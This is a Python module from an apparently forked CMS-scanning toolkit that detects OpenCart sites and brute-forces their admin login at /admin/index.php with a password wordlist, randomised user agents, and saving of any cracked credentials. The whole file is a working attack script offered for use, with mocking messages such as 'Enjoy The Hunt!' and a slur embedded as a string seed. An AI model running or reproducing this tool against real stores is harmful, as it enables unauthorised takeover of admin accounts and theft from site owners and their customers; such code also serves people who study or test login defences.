#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CieMeS, check the LICENSE file for more information
# Rex4 - Cantix Crew
### OpenCart Bruteforce module

import ciemesdb.basic as ciemes
import ciemesdb.sc as source # Contains function to detect cms from source code
import ciemesdb.header as header # Contains function to detect CMS from gathered http headers
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import ciemesdb.generator as generator
import urllib.request


def testlogin(url,user,passw,):
    url = url + '/admin/index.php'
    ua = ciemes.randomua('generatenewuaeverytimetobesafeiguess')
    try:
        ckreq = urllib.request.Request(
        url,
        data=urllib.parse.urlencode({'username':user, 'password':passw}).encode("utf-8"),
        headers={
            'User-Agent': ua
        }
        )
        with urllib.request.urlopen(ckreq, timeout=4) as response:
            scode = response.read().decode()
            headers = str(response.info())
            rurl = response.geturl()
            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers'
            return r
    except Exception as e:
        e = str(e)
        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
        return r
    print('hola')


def start():
    ciemes.clearscreen()
    ciemes.banner("OpenCart Bruteforce Module")
    url = ciemes.targetinp("") # input('Enter Url: ')
    ciemes.info("Checking for OpenCart")
    bsrc = ciemes.getsource(url, ciemes.randomua('foodislove'))
    if bsrc[0] != '1':
        ciemes.error("Could not get target source, CMSeek is quitting")
        ciemes.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'oc':
            occnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'oc':
                occnf = '1'
            else:
                occnf = '0'
    if occnf != '1':
        ciemes.error('Could not confirm OpenCart... CMSeek is quitting')
        ciemes.handle_quit()
    else:
        ciemes.success("OpenCart Confirmed... Checking for OpenCart login form")
        ocloginsrc = ciemes.getsource(url + '/admin/index.php', ciemes.randomua('thatsprettygay'))
        if ocloginsrc[0] == '1' and '<form' in ocloginsrc[1] and 'route=common/login' in ocloginsrc[1]:
            ciemes.success("Login form found!")
            ocparamuser = ['']
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                ocparamuser.append(rusr)
            ocbruteusers = set(ocparamuser) ## Strip duplicate usernames

            for user in ocbruteusers:
                if user != '':
                    passfound = '0'
                    print('\n')
                    ciemes.info("Bruteforcing User: " + ciemes.bold + user + ciemes.cln)
                    pwd_file = open("wordlist/passwords.txt", "r")
                    passwords = pwd_file.read().split('\n')
                    passwords.insert(0, user)
                    for password in passwords:
                        if password != '' and password != '\n':
                            sys.stdout.write('[*] Testing Password: ')
                            sys.stdout.write('%s\r\r' % password)
                            sys.stdout.flush()
                            cursrc = testlogin(url, user, password)
                            if 'route=common/dashboard&user_token=' in str(cursrc[3]):
                                ciemes.success('Password found!')
                                print(" |\n |--[username]--> " + ciemes.bold + user + ciemes.cln + "\n |\n |--[password]--> " + ciemes.bold + password + ciemes.cln + "\n |")
                                ciemes.success('Enjoy The Hunt!')
                                ciemes.savebrute(url,url + '/admin/index.php',user,password)
                                passfound = '1'
                                break
                            else:
                                continue
                            break
                    if passfound == '0':
                        ciemes.error('\n\nPassword ga ketemu bre!')
                    print('\n\n')

        else:
            ciemes.error("Login page ga ketemu..jadinya exit deh!")
            ciemes.handle_quit()
